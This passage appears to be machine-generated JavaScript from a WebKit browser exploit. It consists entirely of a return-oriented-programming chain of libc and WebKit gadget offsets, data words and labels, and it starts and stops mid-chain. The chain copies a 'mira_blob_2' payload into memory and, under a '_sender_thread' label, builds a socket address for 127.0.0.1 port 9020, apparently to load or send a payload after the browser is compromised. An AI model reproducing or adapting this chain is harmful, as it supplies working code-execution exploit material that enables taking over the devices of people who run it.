libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1154624, //L2550
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1154576, //L2547
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1154592, //L2548
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2549:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L2550:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1154680, //L2551
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2551:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1154792, //L2553
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1154824, //L2555
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1154808, //L2554
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2553:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2554:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2555:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1154984, //L2559
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1154936, //L2556
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1154952, //L2557
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2557:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2558:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2559:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1155088, //L2561
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1155072, //L2560
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2560:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2561:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2562:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L2563:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1155288, //L2566
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1155256, //L2564
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2564:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2565:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L2566:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1155392, //L2568
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1155376, //L2567
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2567:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1155504, //L2571
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1155472, //L2569
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2570:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2571:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1155568, //L2573
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+763368 //pop rcx
]);
//L2573:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1155624, //L2574
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2574:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760, //pop rsi
ropchain+1155776, //L2577
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1155792, //L2578
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1155760, //L2576
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2576:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2577:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2578:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1155952, //L2582
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1155904, //L2579
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1155920, //L2580
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2579:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2580:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2581:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1156088, //L2584
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1156104, //L2585
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1156072, //L2583
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2583:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2584:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2585:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1156208, //L2586
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1156224, //L2587
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2586:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1156344, //L2588
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1156328, //L2589
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2589:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1156432, //L2591
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1156416, //L2590
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2590:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1156536, //L2592
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1156552, //L2593
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2592:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1156672, //L2594
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1156656, //L2595
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2595:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2594:
db([0, 0]); // 0x0
//_sender_thread:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1156744, //L2596
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1156808, //L2598
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2600:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+763368, //pop rcx
//L2601:
(window.mira_blob_2||0),
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2603:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+763368, //pop rcx
//L2604:
(window.mira_blob_2_len||0),
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2606:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1157056, //L2608
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1157072, //L2609
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2608:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2609:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1157232, //L2614
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1157184, //L2611
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1157200, //L2612
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2611:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2612:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2613:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2614:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1157368, //L2616
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1157384, //L2617
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1157352, //L2615
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2615:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2616:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2617:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1157496, //L2619
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1157544, //L2622
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1157512, //L2620
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2622:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1157656, //L2623+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1157648, //L2623
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2623:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1157672, //L2623+24
ropchain+1157992, //L2618
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1157728, //L2625
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2624:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2625:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2626:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1157848, //L2627
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1157864, //L2628
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2627:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2628:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1157984, //L2629
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1157968, //L2630
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2630:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2629:
db([0, 0]); // 0x0
//L2618:
set_gadget(libc_base+759608,); //pop rax
//L2631:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2633:
ropchain+1207280, //L2632
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2635:
ropchain+1158152, //L2634
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1171192, //L2636
//L2634:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1158224, //L2637
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2637:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2638:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2639:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2640:
db([2, 0]); // 0x2
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2642:
ropchain+1158440, //L2641
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1173848, //L2643
//L2641:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1158528, //L2645
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2644:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+763368,); //pop rcx
//L2645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
//L2647:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1158632, //L2650
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2649:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
//L2651:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1158728, //L2654
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2653:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2654:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1158800, //L2656
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2655:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1158872, //L2658
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2657:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1158944, //L2660
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2659:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2660:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1159016, //L2662
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2661:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1159088, //L2664
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2663:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1159160, //L2666
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2665:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2666:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1159232, //L2668
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2667:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L2668:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2669:
db([4294967265, 4294967295]); // -0x1f
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1159328, //L2672
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2671:
db([2, 0]); // 0x2
set_gadget(libc_base+759608,); //pop rax
//L2672:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2673:
db([4294967266, 4294967295]); // -0x1e
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1159416, //L2675
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2675:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2676:
db([15651, 0]); // 0x3d23
set_gadgets([
webkit_base+3914787, //mov [rdi], cx
libc_base+764760, //pop rsi
ropchain+1159488, //L2678
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2678:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2679:
db([4294967268, 4294967295]); // -0x1c
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1159568, //L2682
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2681:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+759608,); //pop rax
//L2682:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1159616, //L2683
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2683:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2684:
db([16, 0]); // 0x10
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1159728, //L2686
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2685:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+759608,); //pop rax
//L2686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1159832, //L2688
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2687:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+763368,); //pop rcx
//L2688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1159920, //L2690
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1159936, //L2691
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2690:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1160096, //L2694
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1160128, //L2696
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1160080, //L2693
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1160112, //L2695
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2693:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2694:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2695:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2696:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1160224, //L2698
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1160208, //L2697
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2697:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2700:
ropchain+1160328, //L2699
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1172520, //L2701
//L2699:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
